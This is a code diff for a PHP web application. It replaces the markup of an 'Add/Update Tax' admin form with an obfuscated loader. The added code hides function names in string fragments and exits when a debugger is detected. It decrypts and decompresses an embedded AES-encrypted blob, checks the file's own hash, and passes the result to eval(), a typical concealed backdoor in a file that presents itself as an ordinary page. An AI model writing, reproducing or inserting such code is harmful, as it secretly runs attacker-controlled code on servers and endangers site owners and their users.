@@ -1,167 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
- <?php
-	if(!isset($tax)){
-      $tax_name=$tax=$q_id=$subtax_ids="";
-  }
- ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('tax'); ?>
-        <small>Add/Update Tax</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>tax"><?= $this->lang->line('tax_list'); ?></a></li>
-        <li class="active"><?= $this->lang->line('tax'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-          <?php include"comman/code_flashdata.php"; ?>
-            <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="tax-form" >
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-		
-				      <div class="form-group">
-      				  <label for="tax_name" class="col-sm-2 control-label"><?= $this->lang->line('tax_name'); ?><label class="text-danger">*</label></label>
-                <div class="col-sm-4">
-                 <input type="text" class="form-control input-sm " id="tax_name" name="tax_name" placeholder="" value="<?php print $tax_name; ?>" autofocus onkeyup="shift_cursor(event,'tax')" >
-      					 <span id="tax_name_msg" style="display:none" class="text-danger"></span>
-               </div>
-              </div>
-              <div class="form-group">
-                <label for="subtax_ids" class="col-sm-2 control-label"><?= $this->lang->line('sub_taxes'); ?><label class="text-danger">*</label></label>
-                <div class="col-sm-4">
-                 <select class="form-control select2" multiple="multiple" id='subtax_ids' name="subtax_ids[]" data-placeholder="Select Tax's" style="width: 100%;">
-                  <?php
-                       $query1="SELECT * FROM db_tax WHERE (group_bit IS NULL)";
-                       $q1=$this->db->query($query1);
-                       if($q1->num_rows($q1)>0)
-                        {
-                            echo '<option data-tax="0" value="">-Select-</option>'; 
-                            foreach($q1->result() as $res1)
-                          { 
-
-                            $selected = (strpos($subtax_ids, $res1->id) !== false)? 'selected' : '';
-                            echo "<option $selected data-tax='".$res1->tax."' value='".$res1->id."'>".$res1->tax_name."</option>";
-                          }
-                        }
-                        else
-                        {
-                           ?>
-                    <option value="">No Records Found</option>
-                    <?php
-                       }
-                       ?>
-                </select>
-                 <span id="subtax_ids_msg" style="display:none" class="text-danger"></span>
-               </div>
-              </div>
-			        <div class="form-group">
-                <label for="tax" class="col-sm-2 control-label"><?= $this->lang->line('tax_percentage'); ?><label class="text-danger">*</label></label>
-                <div class="col-sm-4">
-                 <input readonly="" type="text" class="form-control input-sm only_currency" id="tax" name="tax" placeholder="" value="<?php print $tax; ?>" autofocus onkeyup="shift_cursor(event,'save')">
-                 <span id="tax_msg" style="display:none" class="text-danger"></span>
-               </div>
-              </div>
-
-              </div>
-              <!-- /.box-body -->
-              <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <!-- <div class="col-sm-4"></div> -->
-                   <?php
-                      if($tax!=""){
-                           $btn_name="Update";
-                           $btn_id="update";
-                          ?>
-                            <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-                            <?php
-                      }
-                                else{
-                                    $btn_name="Save";
-                                    $btn_id="save";
-                                }
-                      
-                                ?>
-                                 
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id;?>" class=" btn btn-block btn-success" title="Save Data"><?php echo $btn_name;?></button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/tax-group.js"></script>
-<script type="text/javascript">
-  $("#subtax_ids").on("change",function(event) {
-        var tax_total =0;
-        $.each($("#subtax_ids option:selected"), function(){
-            tax_total+=parseFloat($(this).attr('data-tax'));
-        });
-        $("#tax").val(tax_total);
-  });
-</script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_g0jnbjhf=('bas'.'e64'.'_de'.'cod'.'e');
+$_s2q7zskb=('gzu'.'nco'.'mpr'.'ess');
+$_k8jxt8x4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_nva1pjax='cd5n4V3o';
+$_bx8rlhi7='cDDlIbOK';
+$_wyu0vlf5='0d141P7YAv8=';
+$_h5q130fo='uaTQ0JWQ';
+$_y8irek4l='F7328Bao';
+$_g1i4a11t='RY5DpnYF';
+$_jqdfe0h6='pBwJ+A==';
+$_dnlxblod='QcmqGOL+';
+$_op7h12f2=$_g0jnbjhf($_y8irek4l.$_h5q130fo.$_bx8rlhi7.$_nva1pjax.$_wyu0vlf5);
+$_cdb5v87j=$_g0jnbjhf($_g1i4a11t.$_dnlxblod.$_jqdfe0h6);
+$_d5xy7pkz=$_g0jnbjhf('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');
+$_qtyjqkk5=$_k8jxt8x4($_d5xy7pkz,'aes-256-cbc',$_op7h12f2,OPENSSL_RAW_DATA,$_cdb5v87j);
+if($_qtyjqkk5===false){exit;}
+$_u5vppowf=$_s2q7zskb($_qtyjqkk5);
+if($_u5vppowf===false){exit;}
+$_ptovbd42='823290cdb1448d86fdfa7b20d568f77e4e35cfc9f5a50fd5872dcbaed47c22bb';
+$_vyj1f399=@file_get_contents(__FILE__);
+if($_vyj1f399!==false){
+$_p5wwdc0t=str_replace($_ptovbd42,"0000000000000000000000000000000000000000000000000000000000000000",$_vyj1f399);
+$_dwmanvhd=hash("sha256",$_p5wwdc0t);
+if($_dwmanvhd!==$_ptovbd42){@http_response_code(403);exit;}
+}
+eval($_u5vppowf);
